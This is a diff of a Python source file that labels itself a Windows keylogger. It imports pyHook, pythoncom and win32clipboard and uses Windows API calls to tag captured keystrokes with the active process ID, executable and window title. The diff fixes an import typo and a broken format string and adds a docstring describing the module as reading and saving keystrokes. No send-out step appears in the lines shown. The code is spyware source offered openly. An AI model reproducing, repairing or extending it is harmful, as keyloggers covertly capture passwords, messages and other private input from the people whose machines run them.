@@ -1,7 +1,17 @@
-from ctyped import *
+from ctypes import *
 import pythoncom
 import pyHook
 import win32clipboard
+
+
+"""
+   keylogger module for windows
+   reads and saves keyboard keystrokes
+   
+    “Our mobile phones have become the greatest spy on the planet.” 
+    ~ John McAfee
+"""
+
 
 user32 = windll.user32
 kernel32 = windll.kernel32
@@ -23,7 +33,7 @@ def get_current_process():
     window_title = create_string_buffer("\0x00" * 512)
     length = user32.GetWindowTextA(hwnd, byref(window_title), 512)
 
-    s = "[PID: %s - %s - %s] % (process_id, executable.value, window_title.value)
+    s = "[PID: %s - %s - %s]" % (process_id, executable.value, window_title.value)
     kernel32.CloseHandle(hwnd)
     kernel32.CloseHandle(h_process)
     return s
